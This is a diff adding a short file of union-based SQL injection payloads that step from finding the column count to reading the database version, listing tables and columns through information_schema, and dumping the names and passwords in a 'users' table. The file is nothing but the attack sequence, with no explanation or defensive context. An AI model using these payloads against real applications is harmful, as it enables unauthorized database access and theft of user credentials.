@@ -1,0 +1,11 @@
+order by 5
+
+union all select 1,2,3,4,5
+
+union all select version(),database(),3,4,5
+
+union all select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database() 
+
+union all select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=database() and table_name=0x7573657273
+
+union all select 1,group_concat(name,0x3D,passwd),3,4,5 from users 
